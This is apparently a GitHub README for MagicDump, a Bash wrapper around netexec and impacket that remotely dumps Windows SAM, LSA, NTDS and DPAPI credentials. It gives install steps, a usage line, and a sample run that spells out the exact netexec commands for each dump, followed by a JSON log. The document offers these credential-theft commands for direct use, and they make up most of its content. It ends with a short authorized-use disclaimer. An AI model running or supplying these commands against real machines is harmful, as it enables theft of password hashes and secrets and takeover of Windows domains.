# MagicDump

MagicDump is an automated tool designed to remotely dump credentials from Windows machines, including SAM, LSASS, NTDS, and DPAPI. It simplifies the process of extracting sensitive information, providing organized output and support for multiple authentication methods.

<br>

---

<br>

## Features
- **Credential Dumping**: Automates dumping of SAM, LSASS, NTDS, and DPAPI credentials.
- **Flexible Authentication**:
  - Username and Password Authentication.
  - (Upcoming) Pass-the-Hash and Pass-the-Ticket.
- **Organized Output**:
  - Logs actions in JSON format.
  - Saves dumps and logs to `~/.magicdump/`.
- **Real-Time Feedback**: Displays actions on the screen as they happen.

<br>

---

<br>

## Requirements
- Bash Shell
- Tools for credential dumping (e.g., `impacket`, `netexec`, etc.)

<br>

---

<br>

## Installation
Clone the repository:
```bash
git clone https://github.com/Mag1cByt3s/MagicDump.git
cd MagicDump
```

<br>

Make the script executable:
```bash
chmod +x MagicDump
```

<br>

---

<br>

## Usage
Run the script with the required options:
```bash
./MagicDump -t <target_ip> -u <username> -p <password> [--local-auth]
```

<br>

### Arguments
- `-t`: specify the target IP address
- `-u`: specify the username to authenticate as
- `-p`: specify the password
- `--local-auth`: Use local authentication (optional).

<br>

For help:
```bash
./MagicDump -h
```

<br>

---

<br>

## Example
```bash
./MagicDump -t 192.168.1.100 -u Administrator -p SuperSecretPass123
```

<br>

Output:
```bash
==============================
       MagicDump v1.0       
==============================
[INFO] Starting MagicDump against target 192.168.1.100
[INFO] Authenticating as user 'Administrator'...
[INFO] Starting SAM dump using netexec...
[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' --sam > '/home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt' 2>/dev/null
[DEBUG] SAM dump completed successfully. Output saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt
[LOG] Operation: SAM, Status: success
[INFO] SAM dump saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt
[INFO] Starting LSA dump using netexec...
[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' --lsa > '/home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt' 2>/dev/null
[DEBUG] LSA dump completed successfully. Output saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt
[LOG] Operation: LSA, Status: success
[INFO] LSA dump saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt
[INFO] Starting NTDS dump using ntdsutil...
[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' -M ntdsutil > '/home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt' 2>/dev/null
[DEBUG] NTDS dump completed successfully. Output saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt
[LOG] Operation: NTDS, Status: success
[INFO] NTDS dump saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt
[INFO] Dumping complete. Logs saved to /home/user/.magicdump/logs/report_192.168.1.100_20250104140000.json.
```

<br>

---

<br>

## Logfile example

```json
{
  "target_host": "192.168.1.100",
  "operation_time": "2025-01-04T14:00:00Z",
  "credentials_dumped": {
    "SAM": {
      "status": "success",
      "file_path": "/home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt"
    },
    "LSA": {
      "status": "success",
      "file_path": "/home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt"
    },
    "NTDS": {
      "status": "success",
      "file_path": "/home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt",
      "method": "ntdsutil"
    }
  },
  "warnings": [],
  "logs": [
    "Starting MagicDump against target 192.168.1.100",
    "Authenticating as user 'Administrator'...",
    "Starting SAM dump using netexec...",
    "SAM dump saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt",
    "Starting LSA dump using netexec...",
    "LSA dump saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt",
    "Starting NTDS dump using ntdsutil...",
    "NTDS dump saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt",
    "Dumping complete. Logs saved to /home/user/.magicdump/logs/report_192.168.1.100_20250104140000.json."
  ]
}
```

<br>

---

<br>

## Roadmap
- Add support for Pass-the-Hash and Pass-the-Ticket authentication.
- Integrate more advanced credential dumping techniques.
- Encrypt logs and dumps for security.

<br>

---

<br>

## License
[GPLv3 License](LICENSE)

<br>

---

<br>

## Disclaimer
**MagicDump is intended for authorized use only.** Ensure you have permission before using this tool on any system.
